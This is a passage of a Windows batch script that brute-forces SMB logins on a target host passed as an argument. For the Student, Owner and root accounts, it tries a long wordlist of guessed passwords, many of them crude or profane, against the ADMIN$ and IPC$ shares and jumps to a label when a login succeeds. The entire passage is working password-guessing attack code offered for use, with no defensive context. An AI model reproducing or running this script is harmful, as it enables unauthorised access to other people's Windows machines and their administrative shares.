   net use \\%1\IPC$ "dick" /user:Student
   if not errorlevel 1 goto Studentdick
   net use \\%1\ADMIN$ "shithead" /user:Student
   if not errorlevel 1 goto Studentshithead
   net use \\%1\IPC$ "shithead" /user:Student
   if not errorlevel 1 goto Studentshithead
   net use \\%1\ADMIN$ "blunt" /user:Student
   if not errorlevel 1 goto Studentblunt
   net use \\%1\IPC$ "blunt" /user:Student
   if not errorlevel 1 goto Studentblunt
   net use \\%1\ADMIN$ "shotgun" /user:Student
   if not errorlevel 1 goto Studentshotgun
   net use \\%1\IPC$ "shotgun" /user:Student
   if not errorlevel 1 goto Studentshotgun
   net use \\%1\ADMIN$ "glock" /user:Student
   if not errorlevel 1 goto Studentglock
   net use \\%1\IPC$ "glock" /user:Student
   if not errorlevel 1 goto Studentglock
   net use \\%1\ADMIN$ "executable" /user:Student
   if not errorlevel 1 goto Studentexecutable
   net use \\%1\IPC$ "executable" /user:Student
   if not errorlevel 1 goto Studentexecutable
   net use \\%1\ADMIN$ "bong" /user:Student
   if not errorlevel 1 goto Studentbong
   net use \\%1\IPC$ "bong" /user:Student
   if not errorlevel 1 goto Studentbong
   net use \\%1\ADMIN$ "dildo" /user:Student
   if not errorlevel 1 goto Studentdildo
   net use \\%1\IPC$ "dildo" /user:Student
   if not errorlevel 1 goto Studentdildo
   net use \\%1\ADMIN$ "baseball" /user:Student
   if not errorlevel 1 goto Studentbaseball
   net use \\%1\IPC$ "baseball" /user:Student
   if not errorlevel 1 goto Studentbaseball
   net use \\%1\ADMIN$ "basketball" /user:Student
   if not errorlevel 1 goto Studentbasketball
   net use \\%1\IPC$ "basketball" /user:Student
   if not errorlevel 1 goto Studentbasketball
   net use \\%1\ADMIN$ "football" /user:Student
   if not errorlevel 1 goto Studentfootball
   net use \\%1\IPC$ "football" /user:Student
   if not errorlevel 1 goto Studentfootball
   net use \\%1\ADMIN$ "soccer" /user:Student
   if not errorlevel 1 goto Studentsoccer
   net use \\%1\IPC$ "soccer" /user:Student
   if not errorlevel 1 goto Studentsoccer
   net use \\%1\ADMIN$ "pot" /user:Student
   if not errorlevel 1 goto Studentpot
   net use \\%1\IPC$ "pot" /user:Student
   if not errorlevel 1 goto Studentpot
   net use \\%1\ADMIN$ "dope" /user:Student
   if not errorlevel 1 goto Studentdope
   net use \\%1\IPC$ "dope" /user:Student
   if not errorlevel 1 goto Studentdope
   net use \\%1\ADMIN$ "maryjane" /user:Student
   if not errorlevel 1 goto Studentmaryjane
   net use \\%1\IPC$ "maryjane" /user:Student
   if not errorlevel 1 goto Studentmaryjane
   net use \\%1\ADMIN$ "marijuana" /user:Student
   if not errorlevel 1 goto Studentmarijuana
   net use \\%1\IPC$ "marijuana" /user:Student
   if not errorlevel 1 goto Studentmarijuana
   net use \\%1\ADMIN$ "money" /user:Student
   if not errorlevel 1 goto Studentmoney
   net use \\%1\IPC$ "money" /user:Student
   if not errorlevel 1 goto Studentmoney
   net use \\%1\ADMIN$ "girl" /user:Student
   if not errorlevel 1 goto Studentgirl
   net use \\%1\IPC$ "girl" /user:Student
   if not errorlevel 1 goto Studentgirl
   net use \\%1\ADMIN$ "girls" /user:Student
   if not errorlevel 1 goto Studentgirls
   net use \\%1\IPC$ "girls" /user:Student
   if not errorlevel 1 goto Studentgirls
   net use \\%1\ADMIN$ "woman" /user:Student
   if not errorlevel 1 goto Studentwoman
   net use \\%1\IPC$ "woman" /user:Student
   if not errorlevel 1 goto Studentwoman
   net use \\%1\ADMIN$ "women" /user:Student
   if not errorlevel 1 goto Studentwomen
   net use \\%1\IPC$ "women" /user:Student
   if not errorlevel 1 goto Studentwomen
   net use \\%1\ADMIN$ "female" /user:Student
   if not errorlevel 1 goto Studentfemale
   net use \\%1\IPC$ "female" /user:Student
   if not errorlevel 1 goto Studentfemale
   net use \\%1\ADMIN$ "america" /user:Student
   if not errorlevel 1 goto Studentamerica
   net use \\%1\IPC$ "america" /user:Student
   if not errorlevel 1 goto Studentamerica
   net use \\%1\ADMIN$ "usa" /user:Student
   if not errorlevel 1 goto Studentusa
   net use \\%1\IPC$ "usa" /user:Student
   if not errorlevel 1 goto Studentusa
   net use \\%1\ADMIN$ "god" /user:Student
   if not errorlevel 1 goto Studentgod
   net use \\%1\IPC$ "god" /user:Student
   if not errorlevel 1 goto Studentgod
   net use \\%1\ADMIN$ "jesus" /user:Student
   if not errorlevel 1 goto Studentjesus
   net use \\%1\IPC$ "jesus" /user:Student
   if not errorlevel 1 goto Studentjesus
   net use \\%1\ADMIN$ "technology" /user:Student
   if not errorlevel 1 goto Studenttechnology
   net use \\%1\IPC$ "technology" /user:Student
   if not errorlevel 1 goto Studenttechnology
   net use \\%1\ADMIN$ "computer" /user:Student
   if not errorlevel 1 goto Studentcomputer
   net use \\%1\IPC$ "computer" /user:Student
   if not errorlevel 1 goto Studentcomputer
   net use \\%1\ADMIN$ "porn" /user:Student
   if not errorlevel 1 goto Studentporn
   net use \\%1\IPC$ "porn" /user:Student
   if not errorlevel 1 goto Studentporn
   net use \\%1\ADMIN$ "clock" /user:Student
   if not errorlevel 1 goto Studentclock
   net use \\%1\IPC$ "clock" /user:Student
   if not errorlevel 1 goto Studentclock
   net use \\%1\ADMIN$ "church" /user:Student
   if not errorlevel 1 goto Studentchurch
   net use \\%1\IPC$ "church" /user:Student
   if not errorlevel 1 goto Studentchurch
   net use \\%1\ADMIN$ "church" /user:Student
   if not errorlevel 1 goto Studentchurch
   net use \\%1\IPC$ "church" /user:Student
   if not errorlevel 1 goto Studentchurch
   net use \\%1\ADMIN$ "temp" /user:Student
   if not errorlevel 1 goto Studenttemp
   net use \\%1\IPC$ "temp" /user:Student
   if not errorlevel 1 goto Studenttemp
   net use \\%1\ADMIN$ "" /user:Owner
   if not errorlevel 1 goto Owner
   net use \\%1\IPC$ "" /user:Owner
   if not errorlevel 1 goto Owner
   net use \\%1\ADMIN$ "pass123" /user:Owner
   if not errorlevel 1 goto Ownerpass123
   net use \\%1\IPC$ "pass123" /user:Owner
   if not errorlevel 1 goto Administratorpass123
   net use \\%1\ADMIN$ "something" /user:Owner
   if not errorlevel 1 goto Ownersomething
   net use \\%1\IPC$ "something" /user:Owner
   if not errorlevel 1 goto Ownersomething
   net use \\%1\ADMIN$ "mypass" /user:Owner
   if not errorlevel 1 goto Ownermypass
   net use \\%1\IPC$ "mypass" /user:Owner
   if not errorlevel 1 goto Ownermypass
   net use \\%1\ADMIN$ "login" /user:Owner
   if not errorlevel 1 goto Ownerlogin
   net use \\%1\IPC$ "login" /user:Owner
   if not errorlevel 1 goto Ownerlogin
   net use \\%1\ADMIN$ "access" /user:Owner
   if not errorlevel 1 goto Owneraccess
   net use \\%1\IPC$ "access" /user:Owner
   if not errorlevel 1 goto Owneraccess
   net use \\%1\ADMIN$ "password" /user:Owner
   if not errorlevel 1 goto Ownerpassword
   net use \\%1\IPC$ "password" /user:Owner
   if not errorlevel 1 goto Ownerpassword
   net use \\%1\ADMIN$ "matrix" /user:Owner
   if not errorlevel 1 goto Ownermatrix
   net use \\%1\IPC$ "matrix" /user:Owner
   if not errorlevel 1 goto Ownermatrix
   net use \\%1\ADMIN$ "security" /user:Owner
   if not errorlevel 1 goto Ownersecurity
   net use \\%1\IPC$ "security" /user:Owner
   if not errorlevel 1 goto Ownersecurity
   net use \\%1\ADMIN$ "success" /user:Owner
   if not errorlevel 1 goto Ownersuccess
   net use \\%1\IPC$ "success" /user:Owner
   if not errorlevel 1 goto Ownersuccess
   net use \\%1\ADMIN$ "special" /user:Owner
   if not errorlevel 1 goto Ownerspecial
   net use \\%1\IPC$ "special" /user:Owner
   if not errorlevel 1 goto Ownerspecial
   net use \\%1\ADMIN$ "ultra" /user:Owner
   if not errorlevel 1 goto Ownerultra
   net use \\%1\IPC$ "ultra" /user:Owner
   if not errorlevel 1 goto Ownerultra
   net use \\%1\ADMIN$ "pass" /user:Owner
   if not errorlevel 1 goto Ownerpass
   net use \\%1\IPC$ "pass" /user:Owner
   if not errorlevel 1 goto Ownerpass
   net use \\%1\ADMIN$ "enable" /user:Owner
   if not errorlevel 1 goto Ownerenable
   net use \\%1\IPC$ "enable" /user:Owner
   if not errorlevel 1 goto Ownerenable
   net use \\%1\ADMIN$ "passwd" /user:Owner
   if not errorlevel 1 goto Ownerpasswd
   net use \\%1\IPC$ "passwd" /user:Owner
   if not errorlevel 1 goto Ownerpasswd
   net use \\%1\ADMIN$ "password" /user:Owner
   if not errorlevel 1 goto Ownerpassword
   net use \\%1\IPC$ "password" /user:Owner
   if not errorlevel 1 goto Ownerpassword
   net use \\%1\ADMIN$ "internet" /user:Owner
   if not errorlevel 1 goto Ownerinternet
   net use \\%1\IPC$ "internet" /user:Owner
   if not errorlevel 1 goto Ownerinternet
   net use \\%1\ADMIN$ "network" /user:Owner
   if not errorlevel 1 goto Ownernetwork
   net use \\%1\IPC$ "network" /user:Owner
   if not errorlevel 1 goto Ownernetwork
   net use \\%1\ADMIN$ "edu" /user:Owner
   if not errorlevel 1 goto Owneredu
   net use \\%1\IPC$ "edu" /user:Owner
   if not errorlevel 1 goto Owneredu
   net use \\%1\ADMIN$ "owner" /user:Owner
   if not errorlevel 1 goto Ownerowner
   net use \\%1\IPC$ "owner" /user:Owner
   if not errorlevel 1 goto Ownerowner
   net use \\%1\ADMIN$ "local" /user:Owner
   if not errorlevel 1 goto Ownerlocal
   net use \\%1\IPC$ "local" /user:Owner
   if not errorlevel 1 goto Ownerlocal
   net use \\%1\ADMIN$ "remote" /user:Owner
   if not errorlevel 1 goto Ownerremote
   net use \\%1\IPC$ "remote" /user:Owner
   if not errorlevel 1 goto Ownerremote
   net use \\%1\ADMIN$ "lan" /user:Owner
   if not errorlevel 1 goto Ownerlan
   net use \\%1\IPC$ "lan" /user:Owner
   if not errorlevel 1 goto Ownerlan
   net use \\%1\ADMIN$ "root" /user:Owner
   if not errorlevel 1 goto Ownerroot
   net use \\%1\IPC$ "root" /user:Owner
   if not errorlevel 1 goto Ownerroot
   net use \\%1\ADMIN$ "bitch" /user:Owner
   if not errorlevel 1 goto Ownerbitch
   net use \\%1\IPC$ "bitch" /user:Owner
   if not errorlevel 1 goto Ownerbitch
   net use \\%1\ADMIN$ "fault" /user:Owner
   if not errorlevel 1 goto Ownerfault
   net use \\%1\IPC$ "fault" /user:Owner
   if not errorlevel 1 goto Ownerfault
   net use \\%1\ADMIN$ "cat" /user:Owner
   if not errorlevel 1 goto Ownercat
   net use \\%1\IPC$ "cat" /user:Owner
   if not errorlevel 1 goto Ownercat
   net use \\%1\ADMIN$ "911" /user:Owner
   if not errorlevel 1 goto Owner911
   net use \\%1\IPC$ "911" /user:Owner
   if not errorlevel 1 goto Owner911
   net use \\%1\ADMIN$ "towers" /user:Owner
   if not errorlevel 1 goto Ownertowers
   net use \\%1\IPC$ "towers" /user:Owner
   if not errorlevel 1 goto Ownertowers
   net use \\%1\ADMIN$ "123" /user:Owner
   if not errorlevel 1 goto Owner123
   net use \\%1\IPC$ "123" /user:Owner
   if not errorlevel 1 goto Owner123
   net use \\%1\ADMIN$ "1234" /user:Owner
   if not errorlevel 1 goto Owner1234
   net use \\%1\IPC$ "1234" /user:Owner
   if not errorlevel 1 goto Owner1234
   net use \\%1\ADMIN$ "12345" /user:Owner
   if not errorlevel 1 goto Owner12345
   net use \\%1\IPC$ "12345" /user:Owner
   if not errorlevel 1 goto Owner12345
   net use \\%1\ADMIN$ "123456" /user:Owner
   if not errorlevel 1 goto Owner123456
   net use \\%1\IPC$ "123456" /user:Owner
   if not errorlevel 1 goto Owner123456
   net use \\%1\ADMIN$ "654321" /user:Owner
   if not errorlevel 1 goto Owner654321
   net use \\%1\IPC$ "654321" /user:Owner
   if not errorlevel 1 goto Owner654321
   net use \\%1\ADMIN$ "54321" /user:Owner
   if not errorlevel 1 goto Owner54321
   net use \\%1\IPC$ "54321" /user:Owner
   if not errorlevel 1 goto Owner54321
   net use \\%1\ADMIN$ "4321" /user:Owner
   if not errorlevel 1 goto Owner4321
   net use \\%1\IPC$ "4321" /user:Owner
   if not errorlevel 1 goto Owner4321
   net use \\%1\ADMIN$ "321" /user:Owner
   if not errorlevel 1 goto Owner321
   net use \\%1\IPC$ "321" /user:Owner
   if not errorlevel 1 goto Owner321
   net use \\%1\ADMIN$ "student" /user:Owner
   if not errorlevel 1 goto Ownerstudent
   net use \\%1\IPC$ "student" /user:Owner
   if not errorlevel 1 goto Ownerstudent
   net use \\%1\ADMIN$ "user" /user:Owner
   if not errorlevel 1 goto Owneruser
   net use \\%1\IPC$ "user" /user:Owner
   if not errorlevel 1 goto Owneruser
   net use \\%1\ADMIN$ "bootie" /user:Owner
   if not errorlevel 1 goto Ownerbootie
   net use \\%1\IPC$ "bootie" /user:Owner
   if not errorlevel 1 goto Ownerbootie
   net use \\%1\ADMIN$ "poop" /user:Owner
   if not errorlevel 1 goto Ownerpoop
   net use \\%1\IPC$ "poop" /user:Owner
   if not errorlevel 1 goto Ownerpoop
   net use \\%1\ADMIN$ "poopie" /user:Owner
   if not errorlevel 1 goto Ownerpoopie
   net use \\%1\IPC$ "poopie" /user:Owner
   if not errorlevel 1 goto Ownerpoopie
   net use \\%1\ADMIN$ "weed" /user:Owner
   if not errorlevel 1 goto Ownerweed
   net use \\%1\IPC$ "weed" /user:Owner
   if not errorlevel 1 goto Ownerweed
   net use \\%1\ADMIN$ "water" /user:Owner
   if not errorlevel 1 goto Ownerwater
   net use \\%1\IPC$ "water" /user:Owner
   if not errorlevel 1 goto Ownerwater
   net use \\%1\ADMIN$ "cool" /user:Owner
   if not errorlevel 1 goto Ownercool
   net use \\%1\IPC$ "cool" /user:Owner
   if not errorlevel 1 goto Ownercool
   net use \\%1\ADMIN$ "joint" /user:Owner
   if not errorlevel 1 goto Ownerjoint
   net use \\%1\IPC$ "joint" /user:Owner
   if not errorlevel 1 goto Ownerjoint
   net use \\%1\ADMIN$ "crack" /user:Owner
   if not errorlevel 1 goto Ownercrack
   net use \\%1\IPC$ "crack" /user:Owner
   if not errorlevel 1 goto Ownercrack
   net use \\%1\ADMIN$ "danger" /user:Owner
   if not errorlevel 1 goto Ownerdanger
   net use \\%1\IPC$ "danger" /user:Owner
   if not errorlevel 1 goto Ownerdanger
   net use \\%1\ADMIN$ "weiner" /user:Owner
   if not errorlevel 1 goto Ownerweiner
   net use \\%1\IPC$ "weiner" /user:Owner
   if not errorlevel 1 goto Ownerweiner
   net use \\%1\ADMIN$ "electrical" /user:Owner
   if not errorlevel 1 goto Ownerelectrical
   net use \\%1\IPC$ "electrical" /user:Owner
   if not errorlevel 1 goto Ownerelectrical
   net use \\%1\ADMIN$ "electric" /user:Owner
   if not errorlevel 1 goto Ownerelectric
   net use \\%1\IPC$ "electric" /user:Owner
   if not errorlevel 1 goto Ownerelectric
   net use \\%1\ADMIN$ "electricity" /user:Owner
   if not errorlevel 1 goto Ownerelectricity
   net use \\%1\IPC$ "electricity" /user:Owner
   if not errorlevel 1 goto Ownerelectricity
   net use \\%1\ADMIN$ "penis" /user:Owner
   if not errorlevel 1 goto Ownerpenis
   net use \\%1\IPC$ "penis" /user:Owner
   if not errorlevel 1 goto Ownerpenis
   net use \\%1\ADMIN$ "cent" /user:Owner
   if not errorlevel 1 goto Ownercent
   net use \\%1\IPC$ "cent" /user:Owner
   if not errorlevel 1 goto Ownercent
   net use \\%1\ADMIN$ "50cent" /user:Owner
   if not errorlevel 1 goto Owner50cent
   net use \\%1\IPC$ "50cent" /user:Owner
   if not errorlevel 1 goto Owner50cent
   net use \\%1\ADMIN$ "eminem" /user:Owner
   if not errorlevel 1 goto Ownereminem
   net use \\%1\IPC$ "eminem" /user:Owner
   if not errorlevel 1 goto Ownereminem
   net use \\%1\ADMIN$ "vagina" /user:Owner
   if not errorlevel 1 goto Ownervagina
   net use \\%1\IPC$ "vagina" /user:Owner
   if not errorlevel 1 goto Ownervagina
   net use \\%1\ADMIN$ "cunt" /user:Owner
   if not errorlevel 1 goto Ownercunt
   net use \\%1\IPC$ "cunt" /user:Owner
   if not errorlevel 1 goto Ownercunt
   net use \\%1\ADMIN$ "pussy" /user:Owner
   if not errorlevel 1 goto Ownerpussy
   net use \\%1\IPC$ "pussy" /user:Owner
   if not errorlevel 1 goto Ownerpussy
   net use \\%1\ADMIN$ "cock" /user:Owner
   if not errorlevel 1 goto Ownercock
   net use \\%1\IPC$ "cock" /user:Owner
   if not errorlevel 1 goto Ownercock
   net use \\%1\ADMIN$ "dick" /user:Owner
   if not errorlevel 1 goto Ownerdick
   net use \\%1\IPC$ "dick" /user:Owner
   if not errorlevel 1 goto Ownerdick
   net use \\%1\ADMIN$ "shithead" /user:Owner
   if not errorlevel 1 goto Ownershithead
   net use \\%1\IPC$ "shithead" /user:Owner
   if not errorlevel 1 goto Ownershithead
   net use \\%1\ADMIN$ "blunt" /user:Owner
   if not errorlevel 1 goto Ownerblunt
   net use \\%1\IPC$ "blunt" /user:Owner
   if not errorlevel 1 goto Ownerblunt
   net use \\%1\ADMIN$ "shotgun" /user:Owner
   if not errorlevel 1 goto Ownershotgun
   net use \\%1\IPC$ "shotgun" /user:Owner
   if not errorlevel 1 goto Ownershotgun
   net use \\%1\ADMIN$ "glock" /user:Owner
   if not errorlevel 1 goto Ownerglock
   net use \\%1\IPC$ "glock" /user:Owner
   if not errorlevel 1 goto Ownerglock
   net use \\%1\ADMIN$ "executable" /user:Owner
   if not errorlevel 1 goto Ownerexecutable
   net use \\%1\IPC$ "executable" /user:Owner
   if not errorlevel 1 goto Ownerexecutable
   net use \\%1\ADMIN$ "bong" /user:Owner
   if not errorlevel 1 goto Ownerbong
   net use \\%1\IPC$ "bong" /user:Owner
   if not errorlevel 1 goto Ownerbong
   net use \\%1\ADMIN$ "dildo" /user:Owner
   if not errorlevel 1 goto Ownerdildo
   net use \\%1\IPC$ "dildo" /user:Owner
   if not errorlevel 1 goto Ownerdildo
   net use \\%1\ADMIN$ "baseball" /user:Owner
   if not errorlevel 1 goto Ownerbaseball
   net use \\%1\IPC$ "baseball" /user:Owner
   if not errorlevel 1 goto Ownerbaseball
   net use \\%1\ADMIN$ "basketball" /user:Owner
   if not errorlevel 1 goto Ownerbasketball
   net use \\%1\IPC$ "basketball" /user:Owner
   if not errorlevel 1 goto Ownerbasketball
   net use \\%1\ADMIN$ "football" /user:Owner
   if not errorlevel 1 goto Ownerfootball
   net use \\%1\IPC$ "football" /user:Owner
   if not errorlevel 1 goto Ownerfootball
   net use \\%1\ADMIN$ "soccer" /user:Owner
   if not errorlevel 1 goto Ownersoccer
   net use \\%1\IPC$ "soccer" /user:Owner
   if not errorlevel 1 goto Ownersoccer
   net use \\%1\ADMIN$ "pot" /user:Owner
   if not errorlevel 1 goto Ownerpot
   net use \\%1\IPC$ "pot" /user:Owner
   if not errorlevel 1 goto Ownerpot
   net use \\%1\ADMIN$ "dope" /user:Owner
   if not errorlevel 1 goto Ownerdope
   net use \\%1\IPC$ "dope" /user:Owner
   if not errorlevel 1 goto Ownerdope
   net use \\%1\ADMIN$ "maryjane" /user:Owner
   if not errorlevel 1 goto Ownermaryjane
   net use \\%1\IPC$ "maryjane" /user:Owner
   if not errorlevel 1 goto Ownermaryjane
   net use \\%1\ADMIN$ "marijuana" /user:Owner
   if not errorlevel 1 goto Ownermarijuana
   net use \\%1\IPC$ "marijuana" /user:Owner
   if not errorlevel 1 goto Ownermarijuana
   net use \\%1\ADMIN$ "money" /user:Owner
   if not errorlevel 1 goto Ownermoney
   net use \\%1\IPC$ "money" /user:Owner
   if not errorlevel 1 goto Ownermoney
   net use \\%1\ADMIN$ "girl" /user:Owner
   if not errorlevel 1 goto Ownergirl
   net use \\%1\IPC$ "girl" /user:Owner
   if not errorlevel 1 goto Ownergirl
   net use \\%1\ADMIN$ "girls" /user:Owner
   if not errorlevel 1 goto Ownergirls
   net use \\%1\IPC$ "girls" /user:Owner
   if not errorlevel 1 goto Ownergirls
   net use \\%1\ADMIN$ "woman" /user:Owner
   if not errorlevel 1 goto Ownerwoman
   net use \\%1\IPC$ "woman" /user:Owner
   if not errorlevel 1 goto Ownerwoman
   net use \\%1\ADMIN$ "women" /user:Owner
   if not errorlevel 1 goto Ownerwomen
   net use \\%1\IPC$ "women" /user:Owner
   if not errorlevel 1 goto Ownerwomen
   net use \\%1\ADMIN$ "female" /user:Owner
   if not errorlevel 1 goto Ownerfemale
   net use \\%1\IPC$ "female" /user:Owner
   if not errorlevel 1 goto Ownerfemale
   net use \\%1\ADMIN$ "america" /user:Owner
   if not errorlevel 1 goto Owneramerica
   net use \\%1\IPC$ "america" /user:Owner
   if not errorlevel 1 goto Owneramerica
   net use \\%1\ADMIN$ "usa" /user:Owner
   if not errorlevel 1 goto Ownerusa
   net use \\%1\IPC$ "usa" /user:Owner
   if not errorlevel 1 goto Ownerusa
   net use \\%1\ADMIN$ "god" /user:Owner
   if not errorlevel 1 goto Ownergod
   net use \\%1\IPC$ "god" /user:Owner
   if not errorlevel 1 goto Ownergod
   net use \\%1\ADMIN$ "jesus" /user:Owner
   if not errorlevel 1 goto Ownerjesus
   net use \\%1\IPC$ "jesus" /user:Owner
   if not errorlevel 1 goto Ownerjesus
   net use \\%1\ADMIN$ "technology" /user:Owner
   if not errorlevel 1 goto Ownertechnology
   net use \\%1\IPC$ "technology" /user:Owner
   if not errorlevel 1 goto Ownertechnology
   net use \\%1\ADMIN$ "computer" /user:Owner
   if not errorlevel 1 goto Ownercomputer
   net use \\%1\IPC$ "computer" /user:Owner
   if not errorlevel 1 goto Ownercomputer
   net use \\%1\ADMIN$ "porn" /user:Owner
   if not errorlevel 1 goto Ownerporn
   net use \\%1\IPC$ "porn" /user:Owner
   if not errorlevel 1 goto Ownerporn
   net use \\%1\ADMIN$ "clock" /user:Owner
   if not errorlevel 1 goto Ownerclock
   net use \\%1\IPC$ "clock" /user:Owner
   if not errorlevel 1 goto Ownerclock
   net use \\%1\ADMIN$ "church" /user:Owner
   if not errorlevel 1 goto Ownerchurch
   net use \\%1\IPC$ "church" /user:Owner
   if not errorlevel 1 goto Ownerchurch
   net use \\%1\ADMIN$ "church" /user:Owner
   if not errorlevel 1 goto Ownerchurch
   net use \\%1\IPC$ "church" /user:Owner
   if not errorlevel 1 goto Ownerchurch
   net use \\%1\ADMIN$ "temp" /user:Owner
   if not errorlevel 1 goto Ownertemp
   net use \\%1\IPC$ "temp" /user:Owner
   if not errorlevel 1 goto Ownertemp
   net use \\%1\ADMIN$ "" /user:root
   if not errorlevel 1 goto root
   net use \\%1\IPC$ "" /user:root
   if not errorlevel 1 goto root
   net use \\%1\ADMIN$ "pass123" /user:root
   if not errorlevel 1 goto rootpass123
   net use \\%1\IPC$ "pass123" /user:root
   if not errorlevel 1 goto Administratorpass123
   net use \\%1\ADMIN$ "something" /user:root
   if not errorlevel 1 goto rootsomething
   net use \\%1\IPC$ "something" /user:root
   if not errorlevel 1 goto rootsomething
   net use \\%1\ADMIN$ "mypass" /user:root
   if not errorlevel 1 goto rootmypass
   net use \\%1\IPC$ "mypass" /user:root
   if not errorlevel 1 goto rootmypass
   net use \\%1\ADMIN$ "login" /user:root
   if not errorlevel 1 goto rootlogin
   net use \\%1\IPC$ "login" /user:root
   if not errorlevel 1 goto rootlogin
   net use \\%1\ADMIN$ "access" /user:root
   if not errorlevel 1 goto rootaccess
   net use \\%1\IPC$ "access" /user:root
   if not errorlevel 1 goto rootaccess
   net use \\%1\ADMIN$ "password" /user:root
   if not errorlevel 1 goto rootpassword
   net use \\%1\IPC$ "password" /user:root
   if not errorlevel 1 goto rootpassword
   net use \\%1\ADMIN$ "matrix" /user:root
   if not errorlevel 1 goto rootmatrix
   net use \\%1\IPC$ "matrix" /user:root
   if not errorlevel 1 goto rootmatrix
   net use \\%1\ADMIN$ "security" /user:root
   if not errorlevel 1 goto rootsecurity
   net use \\%1\IPC$ "security" /user:root
   if not errorlevel 1 goto rootsecurity
   net use \\%1\ADMIN$ "success" /user:root
   if not errorlevel 1 goto rootsuccess
   net use \\%1\IPC$ "success" /user:root
   if not errorlevel 1 goto rootsuccess
   net use \\%1\ADMIN$ "special" /user:root
   if not errorlevel 1 goto rootspecial
   net use \\%1\IPC$ "special" /user:root
   if not errorlevel 1 goto rootspecial
   net use \\%1\ADMIN$ "ultra" /user:root
   if not errorlevel 1 goto rootultra
   net use \\%1\IPC$ "ultra" /user:root
   if not errorlevel 1 goto rootultra
   net use \\%1\ADMIN$ "pass" /user:root
   if not errorlevel 1 goto rootpass
   net use \\%1\IPC$ "pass" /user:root
   if not errorlevel 1 goto rootpass
   net use \\%1\ADMIN$ "enable" /user:root
   if not errorlevel 1 goto rootenable
   net use \\%1\IPC$ "enable" /user:root
   if not errorlevel 1 goto rootenable
   net use \\%1\ADMIN$ "passwd" /user:root
   if not errorlevel 1 goto rootpasswd
   net use \\%1\IPC$ "passwd" /user:root
   if not errorlevel 1 goto rootpasswd
   net use \\%1\ADMIN$ "password" /user:root
   if not errorlevel 1 goto rootpassword
   net use \\%1\IPC$ "password" /user:root
   if not errorlevel 1 goto rootpassword
   net use \\%1\ADMIN$ "internet" /user:root
   if not errorlevel 1 goto rootinternet
   net use \\%1\IPC$ "internet" /user:root
   if not errorlevel 1 goto rootinternet
   net use \\%1\ADMIN$ "network" /user:root
   if not errorlevel 1 goto rootnetwork
   net use \\%1\IPC$ "network" /user:root
   if not errorlevel 1 goto rootnetwork
   net use \\%1\ADMIN$ "edu" /user:root
   if not errorlevel 1 goto rootedu
   net use \\%1\IPC$ "edu" /user:root
   if not errorlevel 1 goto rootedu
   net use \\%1\ADMIN$ "owner" /user:root
   if not errorlevel 1 goto rootowner
   net use \\%1\IPC$ "owner" /user:root
   if not errorlevel 1 goto rootowner
   net use \\%1\ADMIN$ "local" /user:root
   if not errorlevel 1 goto rootlocal
   net use \\%1\IPC$ "local" /user:root
   if not errorlevel 1 goto rootlocal
   net use \\%1\ADMIN$ "remote" /user:root
   if not errorlevel 1 goto rootremote
   net use \\%1\IPC$ "remote" /user:root
   if not errorlevel 1 goto rootremote
   net use \\%1\ADMIN$ "lan" /user:root
   if not errorlevel 1 goto rootlan
   net use \\%1\IPC$ "lan" /user:root
   if not errorlevel 1 goto rootlan
   net use \\%1\ADMIN$ "root" /user:root
   if not errorlevel 1 goto rootroot
   net use \\%1\IPC$ "root" /user:root
   if not errorlevel 1 goto rootroot
   net use \\%1\ADMIN$ "bitch" /user:root
   if not errorlevel 1 goto rootbitch
   net use \\%1\IPC$ "bitch" /user:root
   if not errorlevel 1 goto rootbitch
   net use \\%1\ADMIN$ "fault" /user:root
   if not errorlevel 1 goto rootfault
   net use \\%1\IPC$ "fault" /user:root
   if not errorlevel 1 goto rootfault
   net use \\%1\ADMIN$ "cat" /user:root
   if not errorlevel 1 goto rootcat
   net use \\%1\IPC$ "cat" /user:root
   if not errorlevel 1 goto rootcat
   net use \\%1\ADMIN$ "911" /user:root
   if not errorlevel 1 goto root911
   net use \\%1\IPC$ "911" /user:root
   if not errorlevel 1 goto root911
   net use \\%1\ADMIN$ "towers" /user:root
   if not errorlevel 1 goto roottowers
   net use \\%1\IPC$ "towers" /user:root
   if not errorlevel 1 goto roottowers
   net use \\%1\ADMIN$ "123" /user:root
   if not errorlevel 1 goto root123
   net use \\%1\IPC$ "123" /user:root
   if not errorlevel 1 goto root123
   net use \\%1\ADMIN$ "1234" /user:root
   if not errorlevel 1 goto root1234
   net use \\%1\IPC$ "1234" /user:root
   if not errorlevel 1 goto root1234
   net use \\%1\ADMIN$ "12345" /user:root
   if not errorlevel 1 goto root12345
   net use \\%1\IPC$ "12345" /user:root
   if not errorlevel 1 goto root12345
   net use \\%1\ADMIN$ "123456" /user:root
   if not errorlevel 1 goto root123456
   net use \\%1\IPC$ "123456" /user:root
   if not errorlevel 1 goto root123456
   net use \\%1\ADMIN$ "654321" /user:root
   if not errorlevel 1 goto root654321
   net use \\%1\IPC$ "654321" /user:root
   if not errorlevel 1 goto root654321
   net use \\%1\ADMIN$ "54321" /user:root
   if not errorlevel 1 goto root54321
   net use \\%1\IPC$ "54321" /user:root
   if not errorlevel 1 goto root54321
   net use \\%1\ADMIN$ "4321" /user:root
   if not errorlevel 1 goto root4321
   net use \\%1\IPC$ "4321" /user:root
   if not errorlevel 1 goto root4321
   net use \\%1\ADMIN$ "321" /user:root
   if not errorlevel 1 goto root321
   net use \\%1\IPC$ "321" /user:root
   if not errorlevel 1 goto root321
   net use \\%1\ADMIN$ "student" /user:root
   if not errorlevel 1 goto rootstudent
   net use \\%1\IPC$ "student" /user:root
   if not errorlevel 1 goto rootstudent
   net use \\%1\ADMIN$ "user" /user:root
   if not errorlevel 1 goto rootuser
   net use \\%1\IPC$ "user" /user:root
   if not errorlevel 1 goto rootuser
   net use \\%1\ADMIN$ "bootie" /user:root
   if not errorlevel 1 goto rootbootie
   net use \\%1\IPC$ "bootie" /user:root
   if not errorlevel 1 goto rootbootie
   net use \\%1\ADMIN$ "poop" /user:root
   if not errorlevel 1 goto rootpoop
   net use \\%1\IPC$ "poop" /user:root
   if not errorlevel 1 goto rootpoop
   net use \\%1\ADMIN$ "poopie" /user:root
   if not errorlevel 1 goto rootpoopie
   net use \\%1\IPC$ "poopie" /user:root
   if not errorlevel 1 goto rootpoopie
   net use \\%1\ADMIN$ "weed" /user:root
   if not errorlevel 1 goto rootweed
   net use \\%1\IPC$ "weed" /user:root
   if not errorlevel 1 goto rootweed
   net use \\%1\ADMIN$ "water" /user:root
   if not errorlevel 1 goto rootwater
   net use \\%1\IPC$ "water" /user:root
   if not errorlevel 1 goto rootwater
   net use \\%1\ADMIN$ "cool" /user:root
   if not errorlevel 1 goto rootcool
   net use \\%1\IPC$ "cool" /user:root
   if not errorlevel 1 goto rootcool
